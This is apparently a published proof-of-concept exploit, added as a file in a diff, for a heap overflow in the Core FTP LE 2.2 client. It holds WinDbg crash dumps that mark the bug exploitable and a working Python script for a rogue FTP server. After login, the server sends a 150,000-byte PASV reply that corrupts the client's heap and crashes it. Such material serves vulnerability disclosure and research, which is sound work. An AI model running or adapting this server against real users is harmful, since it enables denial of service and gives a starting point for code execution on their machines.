@@ -1,0 +1,121 @@
+#-----------------------------------------------------------------------------#
+# Exploit Title: Core FTP LE 2.2 - Heap Overflow PoC                          #
+# Date: Jun 11 2014                                                           #
+# Exploit Author: Gabor Seljan                                                #
+# Software Link: http://www.coreftp.com/                                      #
+# Version: 2.2 build 1798                                                     #
+# Tested on: Windows XP SP3                                                   #
+#-----------------------------------------------------------------------------#
+
+# In some cases the client does not do proper bounds checking on server
+# responses. An overly long reply from the server causes a heap overflow and
+# crashes the application. The USER, PASS, PASV, SYST, PWD, CDUP commands are
+# all vulnerable and possibly other commands are too.
+
+'''
+HEAP[coreftp.exe]: Heap block at 00F17BC8 modified at 00F1BBD1 past requested size of 4001
+(9d8.9f4): Break instruction exception - code 80000003 (first chance)
+eax=00f17bc8 ebx=00f1bbd1 ecx=7c91eab5 edx=015295ab esi=00f17bc8 edi=00004001
+eip=7c90120e esp=015297ac ebp=015297b0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+ntdll!DbgBreakPoint:
+7c90120e cc              int     3
+0:002> dd eax
+00f17bc8  004b0804 011f0733 20373232 41414141
+00f17bd8  41414141 41414141 41414141 41414141
+00f17be8  41414141 41414141 41414141 41414141
+00f17bf8  41414141 41414141 41414141 41414141
+00f17c08  41414141 41414141 41414141 41414141
+00f17c18  41414141 41414141 41414141 41414141
+00f17c28  41414141 41414141 41414141 41414141
+00f17c38  41414141 41414141 41414141 41414141
+0:002> g
+HEAP[coreftp.exe]: Invalid Address specified to RtlFreeHeap( 00C10000, 00F17BD0 )
+(9d8.9f4): Break instruction exception - code 80000003 (first chance)
+eax=00f17bc8 ebx=00f17bc8 ecx=7c91eab5 edx=015295ba esi=00c10000 edi=00f17bc8
+eip=7c90120e esp=015297c4 ebp=015297c8 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+ntdll!DbgBreakPoint:
+7c90120e cc              int     3
+0:002> g
+(9d8.9f4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00f3bff0 ebx=00000000 ecx=41414141 edx=00f1bbf0 esi=00f3bfe8 edi=00c10000
+eip=7c9276dc esp=01529704 ebp=015297d8 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+ntdll!RtlOemStringToUnicodeString+0x277:
+7c9276dc 8901            mov     dword ptr [ecx],eax  ds:0023:41414141=????????
+0:002> !exploitable
+Exploitability Classification: EXPLOITABLE
+Recommended Bug Title: Exploitable - User Mode Write AV starting at ntdll!RtlOemStringToUnicodeString+0x0000000000000277 (Hash=0x72683756.0x417d7f55)
+
+User mode write access violations that are not near NULL are exploitable.
+(b58.cf0): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00f1bbf0 ebx=41414141 ecx=00004141 edx=00c10608 esi=00f1bbe8 edi=41414141
+eip=7c919064 esp=0152d30c ebp=0152d528 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
+ntdll!RtlDosSearchPath_Ustr+0x473:
+7c919064 8b0b            mov     ecx,dword ptr [ebx]  ds:0023:41414141=????????
+0:002> dd eax
+00f1bbf0  41414141 41414141 41414141 41414141
+00f1bc00  41414141 41414141 41414141 41414141
+00f1bc10  41414141 41414141 41414141 41414141
+00f1bc20  41414141 41414141 41414141 41414141
+00f1bc30  41414141 41414141 41414141 41414141
+00f1bc40  41414141 41414141 41414141 41414141
+00f1bc50  41414141 41414141 41414141 41414141
+00f1bc60  41414141 41414141 41414141 41414141
+0:002> dd esi
+00f1bbe8  41414141 41414141 41414141 41414141
+00f1bbf8  41414141 41414141 41414141 41414141
+00f1bc08  41414141 41414141 41414141 41414141
+00f1bc18  41414141 41414141 41414141 41414141
+00f1bc28  41414141 41414141 41414141 41414141
+00f1bc38  41414141 41414141 41414141 41414141
+00f1bc48  41414141 41414141 41414141 41414141
+00f1bc58  41414141 41414141 41414141 41414141
+'''
+
+#!/usr/bin/python
+
+from socket import *
+
+host = "0.0.0.0"
+port = 21
+payload = "A" * 150000
+
+s = socket(AF_INET, SOCK_STREAM)
+s.bind((host, 21))
+s.listen(1)
+
+print "[+] Evil FTP Server started"
+print "[+] Listening on port %d..." % port
+
+conn, addr = s.accept()
+print "[+] Connection accepted from %s" % addr[0]
+conn.send("220 Welcome to Evil FTP Server\r\n")
+conn.recv(1024)  # Receive USER
+conn.send("331 Need password for whatever user\r\n")
+conn.recv(1024)  # Receive PASS
+conn.send("230 User logged in\r\n")
+conn.recv(1024)  # Receive SYST
+conn.send("215 UNIX Type: L8\r\n")
+conn.recv(1024)  # Receive PWD
+conn.send("257 \"/\" is current directory\r\n")
+
+try:
+  print "[+] Sending evil response for 'PASV' command..."
+  conn.recv(1024)  # Receive PASV
+  conn.send("227 "+payload+"\r\n")
+  conn.recv(1024)
+except error as e:
+  if e.errno == 10054:
+    print "[+] Client crashed!"
+  else:
+    print e
+finally:
+  conn.close()
+  s.close()
